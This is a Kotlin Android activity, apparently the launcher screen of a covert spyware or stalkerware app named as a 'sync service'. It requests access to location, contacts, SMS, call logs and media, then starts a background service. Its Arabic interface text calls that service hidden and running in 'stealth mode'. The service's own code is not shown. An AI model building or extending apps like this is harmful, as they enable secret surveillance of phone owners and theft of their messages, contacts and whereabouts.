package com.sync.service

import android.Manifest
import android.app.Activity
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.TextView
import android.widget.LinearLayout

class MainActivity : Activity() {
    private val perms = mutableListOf(
        Manifest.permission.INTERNET,
        Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.FOREGROUND_SERVICE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.VIBRATE
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
            add(Manifest.permission.READ_MEDIA_IMAGES)
            add(Manifest.permission.READ_MEDIA_VIDEO)
            add(Manifest.permission.READ_MEDIA_AUDIO)
        } else {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
            add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(64, 64, 64, 64)
            setBackgroundColor(0xFF0F172A.toInt())
        }
        val status = TextView(this).apply {
            text = "👑 النظام مؤمن ويعمل في وضع التخفي"
            setTextColor(0xFF38BDF8.toInt())
            textSize = 15f
        }
        val btn = Button(this).apply {
            text = "تفعيل وبدء الخدمة الخفية"
            setOnClickListener {
                requestPerms()
                SyncService.start(this@MainActivity)
                status.text = "✅ الخدمة نشطة وخفية"
            }
        }
        layout.addView(status)
        layout.addView(btn)
        setContentView(layout)
        requestPerms()
    }

    private fun requestPerms() {
        val list = perms.filter { checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED }
        if (list.isNotEmpty()) requestPermissions(list.toTypedArray(), 100)
        else SyncService.start(this)
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        SyncService.start(this)
    }
}
